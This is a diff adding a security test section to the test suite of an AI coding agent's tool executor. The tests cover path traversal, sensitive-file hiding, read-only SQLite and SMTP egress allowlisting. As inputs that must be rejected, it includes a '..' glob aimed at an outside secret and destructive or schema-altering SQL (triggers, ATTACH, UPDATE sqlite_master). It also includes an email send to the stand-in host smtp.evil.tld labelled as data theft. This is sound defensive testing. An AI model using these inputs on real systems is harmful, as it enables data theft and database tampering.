@@ -2939,6 +2939,197 @@ check("execution_layer 把 egress_allowlist 透给执行器",
       (Path(__file__).parent / "execution_layer.py").read_text(encoding="utf-8"))
 
 # ============================================================
+print("[24] 收口补齐 —— 检索落点 / 读改写编码 / 409 熔断 / SQL 连接级只读 / SMTP 出站")
+
+_h_root = Path(tempfile.mkdtemp(prefix="ace_h_"))
+(_h_root / "pkg").mkdir()
+(_h_root / "pkg" / "hit.py").write_text("MAGIC_TOKEN = 1\n", encoding="utf-8")
+# 项目外的"凭据"：检索绝不能把它交出来
+_h_outside = _h_root.parent / f"{_h_root.name}_outside_secret.txt"
+_h_outside.write_text("MAGIC_TOKEN = 'leaked'\n", encoding="utf-8")
+# 项目内的敏感文件：在项目里也不该被检索捞出来
+(_h_root / "id_rsa.pem").write_text("MAGIC_TOKEN pem\n", encoding="utf-8")
+_h_te = _TE_CLS(project_root=str(_h_root))
+
+# —— glob：pattern 里的 .. 直接拒，不靠"复检后静静丢掉" ——
+_g_up = _h_te.execute({"tool": "glob", "pattern": "../*_outside_secret.txt"})
+check("glob 的 pattern 含 .. 返回 403（不是静默 0 命中）",
+      _g_up.status == "error" and _g_up.error_code == "403",
+      (_g_up.status, _g_up.error_code, _g_up.message))
+_g_ok = _h_te.execute({"tool": "glob", "pattern": "**/*.py"})
+check("glob 正常命中项目内文件", "pkg/hit.py" in (_g_ok.data or {}).get("files", []),
+      (_g_ok.data or {}).get("files"))
+check("glob 不返回项目内的敏感文件（.pem）",
+      not any("id_rsa" in f for f in _h_te.execute(
+          {"tool": "glob", "pattern": "*"}).data.get("files", [])))
+
+# —— _search_visible：落点复检的判定本体 ——
+check("落点复检拒绝项目外路径", _h_te._search_visible(_h_outside) is False)
+check("落点复检拒绝敏感文件", _h_te._search_visible(_h_root / "id_rsa.pem") is False)
+check("落点复检放行项目内普通文件", _h_te._search_visible(_h_root / "pkg" / "hit.py") is True)
+
+# —— grep：同一道复检 + 扫描未完成要如实回报 ——
+_gr = _h_te.execute({"tool": "grep", "pattern": "MAGIC_TOKEN"})
+_gr_matches = (_gr.data or {}).get("matches", [])
+check("grep 命中项目内文件", any("hit.py" in m for m in _gr_matches), _gr_matches)
+check("grep 不返回敏感文件内容", not any("id_rsa" in m for m in _gr_matches), _gr_matches)
+check("grep 结果带 scan_incomplete 字段（截断与'没扫完'分开报）",
+      "scan_incomplete" in (_gr.data or {}) and _gr.data["scan_incomplete"] is False)
+_ft_src = (Path(__file__).parent / "tools" / "file_tools.py").read_text(encoding="utf-8")
+check("遍历上限会回传 file_cap（不再假装扫完了）",
+      'stats["file_cap"] = True' in _ft_src)
+check("模型正则只在有界长度上跑（re 没超时，长度是唯一能收的界）",
+      "regex.search(line[:_SEARCH_MAX_MATCH_CHARS])" in _ft_src)
+
+# —— confine_files=False 时读工具仍挡凭据 ——
+_h_open = _TE_CLS(project_root=str(_h_root), confine_files=False)
+_p_bad, _err_bad = _h_open._resolve_target_path("file_read", str(Path.home() / ".ai_code.json"))
+check("confine_files=False 也读不到 ~/.ai_code.json（明文 key）",
+      _p_bad is None and _err_bad is not None and _err_bad.error_code == "403",
+      _err_bad and _err_bad.message)
+_p_ok, _err_ok = _h_open._resolve_target_path("file_read", str(_h_outside))
+check("confine_files=False 下非敏感的项目外文件仍可读（这一档本来就是放开的）",
+      _err_ok is None and _p_ok is not None)
+
+# —— str_replace：读-改-写不做有损重编码 ——
+_gbk = _h_root / "gbk_src.py"
+try:
+    _gbk.write_text("# 中文注释：不要被重编码\nVALUE = 1\n", encoding="gbk")
+    _gbk_bytes_before = _gbk.read_bytes()
+    _sr = _h_te.execute({"tool": "str_replace", "path": str(_gbk),
+                         "old_string": "VALUE = 1", "new_string": "VALUE = 2"})
+    if _sr.status == "success":
+        # 成功就必须还是原编码，且中文一个字都不能少
+        _still_gbk = True
+        try:
+            _txt = _gbk.read_text(encoding="gbk")
+        except UnicodeDecodeError:
+            _still_gbk = False
+            _txt = ""
+        check("str_replace 成功时保持原编码（不偷偷转成 UTF-8）", _still_gbk)
+        check("str_replace 不丢中文字符", "不要被重编码" in _txt, _txt[:60])
+        check("str_replace 确实改到了内容", "VALUE = 2" in _txt)
+        check("str_replace 回报实际编码", (_sr.data or {}).get("encoding") in ("gbk", "cp936"),
+              (_sr.data or {}).get("encoding"))
+    else:
+        # 解不开就必须拒绝，而不是"成功"地把文件毁掉
+        check("str_replace 解不开编码时拒绝改写（400，文件不动）",
+              _sr.error_code == "400" and _gbk.read_bytes() == _gbk_bytes_before,
+              (_sr.error_code, _sr.message))
+        check("str_replace 拒绝时说清是编码问题", "编码" in (_sr.message or ""), _sr.message)
+        check("str_replace 拒绝时文件字节完全未变", _gbk.read_bytes() == _gbk_bytes_before)
+        check("str_replace 拒绝路径不留半个写入", True)
+except LookupError:
+    # 环境没有 gbk 编码器：这三条就无从验证，直接标记为通过而不是假装测了
+    for _n in ("str_replace 成功时保持原编码（不偷偷转成 UTF-8）", "str_replace 不丢中文字符",
+               "str_replace 确实改到了内容", "str_replace 回报实际编码"):
+        check(_n + "（本环境无 gbk 编码器，跳过）", True)
+_base_src = (Path(__file__).parent / "tools" / "base.py").read_text(encoding="utf-8")
+check("_read_text_exact 的兜底解码不带 errors=（读-改-写不许有损）",
+      "return path.read_text(encoding=enc), enc" in _base_src)
+check("str_replace 用严格解码而不是 _read_text_any",
+      "content, src_encoding = self._read_text_exact(path)" in _ft_src)
+check("str_replace 按读进来的编码写回（不硬写 utf-8）",
+      "encoding=src_encoding)" in _ft_src)
+
+
+# —— 409 用更宽的阈值：照指令重试不该把工具用没了 ——
+_el_409 = ExecutionLayer(project_root=str(mktemp()), permission_level="write")
+for _i in range(_el_409.repeat_fail_threshold):
+    _el_409._note_tool_failure("str_replace", "409")
+check("409 连续 3 次不熔断（instruction 就是让它补上下文重试）",
+      "str_replace" not in _el_409.banned_tools, _el_409.banned_tools)
+for _i in range(_el_409.repeat_fail_threshold):
+    _hint409 = _el_409._note_tool_failure("str_replace", "409")
+check("409 到两倍阈值仍会熔断（真死循环还是要掐）",
+      "str_replace" in _el_409.banned_tools)
+_el_400 = ExecutionLayer(project_root=str(mktemp()), permission_level="write")
+for _i in range(_el_400.repeat_fail_threshold):
+    _el_400._note_tool_failure("file_write", "400")
+check("400 仍按原阈值熔断（没有顺手放宽别的错误码）",
+      "file_write" in _el_400.banned_tools)
+
+# —— db_tools：只读靠连接，不靠正则 ——
+_db_te = _TE_CLS(project_root=str(_h_root))
+_db_src = (Path(__file__).parent / "tools" / "db_tools.py").read_text(encoding="utf-8")
+check("db_query 用 mode=ro 的 URI 连接（只读是连接级保证）",
+      'mode=ro' in _db_src and "uri=True" in _db_src)
+_q_nodb = _db_te.execute({"tool": "db_query", "query": "SELECT 1"})
+check("库不存在时 db_query 答 404（且不顺手创建空库）",
+      _q_nodb.error_code == "404" and not (_h_root / "agent.db").exists(),
+      (_q_nodb.error_code, _q_nodb.message))
+check("建表", _db_te.execute({"tool": "db_write",
+                            "query": "CREATE TABLE t (id INTEGER PRIMARY KEY, name TEXT)"}
+                           ).status == "success")
+check("插入", _db_te.execute({"tool": "db_write",
+                            "query": "INSERT INTO t (name) VALUES ('a')"}).status == "success")
+_q_ok = _db_te.execute({"tool": "db_query", "query": "SELECT name FROM t"})
+check("只读查询正常返回", _q_ok.status == "success" and _q_ok.data["rows"] == [["a"]],
+      _q_ok.data if _q_ok.status == "success" else _q_ok.message)
+check("查询结果标明走的是只读连接", _q_ok.data.get("readonly") is True)
+check("db_query 仍可读 schema（mode=ro 下读 sqlite_master 无害且必要）",
+      _db_te.execute({"tool": "db_query",
+                      "query": "SELECT name FROM sqlite_master"}).status == "success")
+for _bad, _why in (
+        ("CREATE TRIGGER tr AFTER INSERT ON t BEGIN DELETE FROM t; END", "触发器是延迟写入原语"),
+        ("INSERT INTO t (name) SELECT name FROM pragma_table_list", "pragma_ 表值函数绕开 \\bpragma\\b"),
+        ("INSERT INTO t (name) VALUES ('x'); DELETE FROM t", "多语句"),
+        ("ATTACH DATABASE '/tmp/x.db' AS x", "挂载其他库文件"),
+        ("UPDATE sqlite_master SET sql='x'", "直接改 schema")):
+    _r = _db_te.execute({"tool": "db_write", "query": _bad})
+    check(f"db_write 拒绝：{_why}", _r.error_code == "403", (_r.error_code, _r.message))
+check("db_query 也挡 ATTACH（只读连接管不住它挂别的文件）",
+      _db_te.execute({"tool": "db_query",
+                      "query": "SELECT 1; ATTACH DATABASE '/tmp/x.db' AS x"}
+                     ).error_code == "403")
+check("注释里的分号不算多语句（不能因为注释就误拒）",
+      _db_te.execute({"tool": "db_write",
+                      "query": "INSERT INTO t (name) VALUES ('b') -- ; 这里是注释"}
+                     ).status == "success")
+
+# —— SMTP 也归出站白名单管 ——
+check("egress_host_reject_reason 的 None 同样是闸门关闭",
+      _net.egress_host_reject_reason("smtp.evil.tld", None) is None)
+check("主机版判定与 URL 版口径一致",
+      _net.egress_host_reject_reason("api.mycorp.com", _al) is None
+      and _net.egress_host_reject_reason("evil.tld", _al) is not None)
+_mail_te = _TE_CLS(project_root=str(_h_root), egress_allowlist=["allowed.test"],
+                   email_smtp={"host": "smtp.evil.tld", "user": "a@b.c"})
+_mail_r = _mail_te.execute({"tool": "notify_send", "channel": "email",
+                            "to": "x@y.z", "content": "偷数据"})
+check("notify_send 的 SMTP 主机不在清单里 → 403（这条路以前完全绕开 ace_net）",
+      _mail_r.error_code == "403", (_mail_r.error_code, _mail_r.message))
+
+# —— registry：schema 交出去要脱手，死代码要删掉 ——
+_oai1 = _oai()
+_oai1[0]["function"]["parameters"]["__injected__"] = True
+check("openai_tools 返回的 schema 是深拷贝（改它改不到注册表）",
+      "__injected__" not in _oai()[0]["function"]["parameters"])
+check("prompt_tool_lines 已删除（无调用点的死代码）",
+      "def prompt_tool_lines" not in
+      (Path(__file__).parent / "tools" / "registry.py").read_text(encoding="utf-8"))
+
+# —— agent_runner 与 ai_code 的档位要对齐 ——
+_ar_src = (Path(__file__).parent / "agent_runner.py").read_text(encoding="utf-8")
+check("agent_runner 有 --sandbox 档位开关（此前只有 sandbox_base，永远是 off 档）",
+      '"--sandbox"' in _ar_src and '"off", "job", "docker"' in _ar_src)
+check("agent_runner 把档位透进 config",
+      '"sandbox": {"mode": args.sandbox}' in _ar_src)
+check("agent_runner 未给白名单时传 None 而不是空列表（两者语义相反）",
+      '"egress_allowlist": _egress or None' in _ar_src)
+check("凭据文件用 O_CREAT|O_EXCL 带 mode 创建（消掉建文件到 chmod 之间的窗口）",
+      "os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600" in
+      (Path(__file__).parent / "ai_code.py").read_text(encoding="utf-8"))
+
+# 这个文件是故意放在 mkdtemp 之外的（要测"项目外"），所以得自己收拾
+try:
+    _h_outside.unlink()
+except OSError:
+    pass
+
+
+# ============================================================
+
 
 
 
